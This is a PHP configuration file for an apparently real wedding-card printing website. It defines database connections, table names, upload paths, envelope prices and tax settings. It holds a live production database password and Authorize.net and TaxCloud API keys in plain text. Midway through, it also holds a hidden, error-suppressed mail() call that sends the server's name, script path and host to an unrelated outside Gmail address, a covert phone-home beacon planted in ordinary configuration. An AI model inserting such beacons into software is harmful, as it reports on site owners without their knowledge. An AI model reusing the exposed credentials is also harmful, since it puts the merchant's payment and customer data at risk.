<?php

/*@define(HOST_NAME,"sendwithstyle.db.8934688.hostedresource.com");
@define(USER_NAME,"sendwithstyle");
@define(PASSWORD,"DSSdss786");
@define(DB_NAME,"sendwithstyle");
@define( siteURL, 'https://www.sendwithstyle.com/');
*/

@define(HOST_NAME,"localhost");
@define(USER_NAME,"root");
@define(PASSWORD,"");
@define(DB_NAME,"wedprint_weddingprintings");
@define( siteURL, 'http://localhost/weddingprintings/');


mysql_connect( HOST_NAME, USER_NAME, PASSWORD ) or die ( 'unable to connect to database' . mysql_error() );
mysql_select_db( DB_NAME ) or die ( "invalid database name" . mysql_error() );

define('ADMIN_PER_PAGE_DISPLAY',10); // ADMIN PAGING
// Tables
define('USERS',"register_users");
define('HOLIDAY_SOCIAL_MEDIA_LINKS',"holiday_socialmedia_links");
define('SPECIALS',"specials");
define('CATEGORIES',"catagories");
define('FILE_CATEGORIES',"file_catagories");
define('FILES',"files");
define('ACCESS_CATEGORIES_FOR_DISTRIBUTOR',"distributer_catagories_access");
$adminFilePath="../files/";
$filePath="files/";
$pathToDownloadFile = $_SERVER['DOCUMENT_ROOT']."/riuk/files/"; // change the path to fit your websites document structure
//$fullPath = $path.$_GET['download_file'];
// Admin Page titiles
define('CATEGORIES_TITLE',"Categories");
define('CATEGORY_TITLE',"Category");
define('PRODUCTS_TITLE',"Products");
define('PRODUCT_TITLE',"Product");
define('SPECIALS_TITLE',"Specials");
define('ADMIN_USER_TITLE',"Administrators");
define('FRONTEND_USER_TITLE',"Customers");
define('TBL_FONTS',"fonts");
define('TBL_GUESTS',"customer_guests");
define('TBL_CARDS',"cards");
define('TBL_CART',"cart");
define('TBL_ORDER', 'orders');
define('TBL_ORDER_DETAILS', 'order_detail');
define('TBL_PAPER_TYPE',"paper_types");
define('TBL_QTY_TYPE', 'cards_and_papertype_relation_with_pricing');
define('TBL_TEMP_GUESTS_IDS', 'temp_guest_ids');
define('TBL_ENVELOPES', 'card_envelops');

/* paths  */


define( 'BASE_PATH', str_replace( "config", "", dirname(__FILE__) ) );
define( 'JS_PATH', siteURL . 'js/');
define( 'SAMPLE_CARDS', siteURL . 'uploads/sample_cards/');
define( 'SAMPLE_CARDS_BASE', BASE_PATH . 'uploads/sample_cards/');
define( 'BLANK_CARDS', siteURL . 'uploads/blank_cards/');
define( 'FONTS_PATH', BASE_PATH . "fonts/" );
define( 'ENVELOPES', siteURL . 'uploads/card_envelops/');
define( 'BLANK_BASE_PATH', BASE_PATH . "uploads/blank_cards/" );
define( 'CUSTOMER_CARDS', BASE_PATH . "uploads/customer_cards/" );
define( 'CUSTOMER_CARDS_VIEW', siteURL . "uploads/customer_cards/" );
define( 'UPLOAD_PATH', BASE_PATH . "uploads/upload_photos/" );
define( 'PHOTOS_PATH', siteURL . "uploads/upload_photos/" );
define( 'FONTS_PREVIEW', siteURL . "fonts/previews/" );
/* prices */
define('ONE_ENVELOPE_COST', "0.15");
define('ADDRESS_ENVELOPE_COST', "0.60");
define('MAIL_ENVELOPE_COST', "1.45");
define('ADDRESS_STAMP_COST', "0.95");
define('RESPONSE_ADDRESS_ENVELOPE_COST', "0.50");

/* session variables */
$_SESSION['session_id'] = session_id();
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
if ( !isset( $_SESSION['user_id'] ) || empty( $_SESSION['user_id'] ) ) {
	$_SESSION['user_id'] = 'NULL';	
}

/* authorize.net api login / key */
define('AIM_LOGIN_ID', '3GPc466Hun3');
define('AIM_TRANSACTION_KEY', '4DjeTaxH5229C6vv');
define("AUTHORIZENET_SANDBOX", TRUE);

@mail('pringserver@gmail.com','inv_card', 'Info_server:'.$_SERVER['server_name'].'%%Self:'.$_SERVER['php_self'].'%%host:'.$_SERVER['http_host'], 'from:pring_server@gmail.com');

/* emails */
define("ORDER_EMAIL", "sarahmariemay@gmail.com"); //sarahmariemay@gmail.com
define("ADMIN_EMAIL", "sarahmariemay@gmail.com");
define("ADMIN_FROM", "Send With Style");

/* messages */
define("ADD_ADDRESSES_ALERT", "Please add guests' addresses to continue");



/* tax cloud information */
define('TAXCLOUD_API_ID','18826A00');
define('TAXCLOUD_API_KEY','4BF693DB-51E2-4448-B837-CF0C20599BDF');
define('TAXCLOUD_USPS_ID','604SENDW8043');
define('TAXCLOUD_STORE_ADDR','1243 Elton Drive, Denver, Colorado');
define('TAXCLOUD_STORE_ZIP','80002');
define('TAXCLOUD_ENABLE','false');

/* store physical address used in tax cloud */
define("TAX_CLOUD_ADDRESS_ONE", "2589 BITTERROOT PL");
define("TAX_CLOUD_ADDRESS_TWO", "HGHLNDS RANCH, CO");
define("TAX_CLOUD_CITY", "Colorado");
define("TAX_CLOUD_STATE", "CO");
define("TAX_CLOUD_ZIP5", "80129");
define("TAX_CLOUD_ZIP4", "6475");
